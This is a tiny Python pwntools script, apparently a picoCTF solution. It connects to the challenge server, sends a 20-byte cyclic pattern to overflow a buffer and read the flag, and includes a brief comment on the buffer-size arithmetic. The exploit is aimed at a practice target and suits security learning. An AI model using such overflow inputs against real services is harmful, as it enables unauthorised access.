from pwn import *

r = remote('saturn.picoctf.net', 65443)
# r = process("./vuln")

"""
`buf1[100]` has length 100, `buf2[16]` has length 16 and flag size is 64
so 100 - 16 - 64 = 20, which is the length we can reach `flag.txt`.
"""

r.sendline(cyclic(20))

r.interactive()
